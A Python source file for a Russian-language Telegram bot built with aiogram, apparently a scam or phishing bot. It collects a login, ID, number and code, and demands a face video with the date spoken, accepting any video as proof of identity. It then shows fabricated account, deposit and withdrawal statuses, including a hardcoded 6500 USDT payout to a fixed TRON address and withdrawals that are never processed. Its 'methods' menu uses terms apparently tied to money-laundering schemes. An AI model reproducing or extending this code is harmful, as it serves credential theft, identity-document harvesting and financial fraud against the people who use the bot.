from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from states import Registration
import keyboards as kb

router = Router()

# --- 1. АВТОРИЗАЦИЯ (ОБЯЗАТЕЛЬНЫЙ СТАРТ) ---

@router.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    # Сбрасываем старое состояние, если оно было, и начинаем заново
    await state.clear() 
    await message.answer(
        "Добро пожаловать! Для начала работы введите ваши данные в формате:\n"
        "<code>логин;id;номер;код</code>", 
        parse_mode="HTML"
    )
    await state.set_state(Registration.waiting_for_data)

@router.message(Registration.waiting_for_data)
async def process_data(message: types.Message, state: FSMContext):
    if not message.text or ';' not in message.text:
        await message.answer("⚠️ Неверный формат. Введите данные через ; (логин;id;номер;код)")
        return

    parts = [p.strip() for p in message.text.split(';')]
    if len(parts) < 4 or not all(parts[:4]):
        await message.answer("⚠️ Неверный формат. Нужно 4 значения: логин;id;номер;код")
        return

    login = parts[0]
    await state.update_data(user_login=login)

    text = ("В целях идентификации личности, пожалуйста, предоставьте видео, "
            "где ваше лицо хорошо различимо, и в котором вы чётко называете "
            "дату и время на момент записи.")
    await message.answer(text)
    await state.set_state(Registration.waiting_for_video)

@router.message(Registration.waiting_for_video, F.video | F.video_note | F.document)
async def process_video(message: types.Message, state: FSMContext):
    if message.document and not (
        message.document.mime_type or ""
    ).startswith("video/"):
        await message.answer("⚠️ Отправьте видеофайл или видеосообщение.")
        return

    await message.answer(
        "✅ Ваша личность подтверждена. Добро пожаловать в главное меню!", 
        reply_markup=kb.get_main_menu_keyboard()
    )
    await state.set_state(Registration.main_menu)


@router.message(Registration.waiting_for_video)
async def process_video_invalid(message: types.Message):
    await message.answer("⚠️ Пожалуйста, отправьте видео для подтверждения личности.")


# --- 2. ЛИЧНЫЙ КАБИНЕТ (ПО НОВОМУ СКРИНШОТУ) ---

@router.message(F.text == "👤 Личный кабинет", Registration.main_menu)
async def show_profile(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    login = user_data.get("user_login", "Не указан")
    
    # Текст в точности как на твоем последнем скрине
    profile_text = (
        f"<b>Логин:</b> {login}\n\n"
        f"<b>Статус:</b> деактивирован аккаунт 🚫\n\n"
        f"<b>Уведомление для трейдера 🔔</b>\n\n"
        f"<b>Вывод:</b>\n\n"
        f"<b>Сумма:</b> 6500 USDT/TRX\n\n"
        f"<b>Адрес получения (подтвержден трейдером):</b>\n"
        f"<code>TGW7C2EGBNqMUm8eVwXtjP83zfsboGcV6E</code>\n\n\n"
        f"<b>Статус:</b> In the process of payment processing."
    )
    await message.answer(profile_text, parse_mode="HTML", reply_markup=kb.get_cabinet_keyboard())


# --- 3. ФИНАНСОВЫЕ ОПЕРАЦИИ ---

@router.message(F.text == "💰 Заявка на депозит", Registration.main_menu)
async def deposit_handler(message: types.Message, state: FSMContext):
    await message.answer(
        "💎 <b>Создание заявки на депозит</b>\n\nПожалуйста, введите желаемую сумму пополнения (в USDT):",
        parse_mode="HTML"
    )
    await state.set_state(Registration.waiting_for_deposit_amount)

@router.message(Registration.waiting_for_deposit_amount)
async def process_deposit_amount(message: types.Message, state: FSMContext):
    if not message.text or not message.text.replace(".", "", 1).isdigit():
        await message.answer("⚠️ Введите сумму числом, например: 500")
        return

    response_text = (
        "✅ <b>Заявка успешно сформирована!</b>\n\n"
        f"<b>Сумма:</b> {message.text} USDT\n"
        "<b>Статус:</b> В обработке ⏳\n\n"
        "Ваш запрос передан в финансовый отдел. Пожалуйста, ожидайте сообщения от менеджера.\n\n"
        "<i>Обычно это занимает от 5 до 15 минут.</i>"
    )
    await message.answer(response_text, parse_mode="HTML", reply_markup=kb.get_main_menu_keyboard())
    await state.set_state(Registration.main_menu)

@router.message(F.text == "💸 Заявка на вывод", Registration.main_menu)
async def withdraw_step_1(message: types.Message, state: FSMContext):
    await message.answer(
        "📤 <b>Заявка на вывод средств</b>\n\nМинимальная сумма вывода — 1000 USDT.\nВведите желаемую <b>сумму вывода</b>:",
        parse_mode="HTML"
    )
    await state.set_state(Registration.waiting_for_withdraw_amount)

@router.message(Registration.waiting_for_withdraw_amount)
async def withdraw_step_2(message: types.Message, state: FSMContext):
    if not message.text or not message.text.replace(".", "", 1).isdigit():
        await message.answer("⚠️ Введите сумму числом, минимум 1000 USDT")
        return

    amount = float(message.text)
    if amount < 1000:
        await message.answer("⚠️ Минимальная сумма вывода — 1000 USDT")
        return

    await state.update_data(withdraw_amount=message.text)
    await message.answer(
        "💳 <b>Реквизиты</b>\n\nВведите <b>адрес вашего USDT кошелька</b> для получения средств:",
        parse_mode="HTML"
    )
    await state.set_state(Registration.waiting_for_withdraw_wallet)

@router.message(Registration.waiting_for_withdraw_wallet)
async def withdraw_finish(message: types.Message, state: FSMContext):
    response_text = (
        "📤 <b>Запрос на вывод средств принят</b>\n\n"
        "Ваш запрос успешно передан в финансовый отдел.\n"
        "<b>Среднее время обработки:</b> до 7 рабочих дней."
    )
    await message.answer(response_text, parse_mode="HTML", reply_markup=kb.get_main_menu_keyboard())
    await state.set_state(Registration.main_menu)


# --- 4. ОСТАЛЬНОЕ ---

@router.message(F.text == "🛠 Методы", Registration.main_menu)
async def show_methods(message: types.Message):
    await message.answer("Выберите интересующий вас метод работы:", reply_markup=kb.get_methods_keyboard())

@router.message(F.text == "🆘 Поддержка", Registration.main_menu)
async def show_support(message: types.Message):
    await message.answer("🆘 Связь с поддержкой: @managment_1x")

@router.message(F.text == "🔔 Уведомления", Registration.main_menu)
async def show_notifications(message: types.Message):
    await message.answer(
        "🔔 <b>Уведомления</b>\n\nНовых уведомлений нет.",
        parse_mode="HTML",
    )

@router.message(F.text == "🔗 Загрузить хеш-транзакции", Registration.main_menu)
async def upload_tx_hash(message: types.Message):
    await message.answer(
        "🔗 Отправьте хеш транзакции одним сообщением.\n"
        "После проверки менеджер свяжется с вами."
    )

@router.message(F.text == "⬅️ Назад в главное меню", Registration.main_menu)
async def back_to_main(message: types.Message):
    await message.answer("Вы вернулись в главное меню.", reply_markup=kb.get_main_menu_keyboard())


# --- 5. ЖЕСТКИЙ ФИЛЬТР (ОБЯЗАТЕЛЬНО НАЖАТЬ /START) ---

@router.message()
async def global_security_filter(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    
    if current_state is None:
        await message.answer(
            "🛑 <b>Доступ ограничен.</b>\n\n"
            "Для продолжения работы необходимо нажать /start и пройти авторизацию.",
            parse_mode="HTML",
        )
        return

    if current_state != Registration.main_menu.state:
        return

    methods_list = [
        "🔄 Внутренний трафик", "📩 Прием", "📤 Выплата", "🚀 Залив",
        "🚜 Ферма", "📦 БТ", "🌍 Трансгран", "🤝 Контрагенты",
    ]
    if message.text in methods_list:
        await message.answer(f"Раздел «{message.text}» временно пуст.")
    else:
        await message.answer("Пожалуйста, используйте кнопки меню.")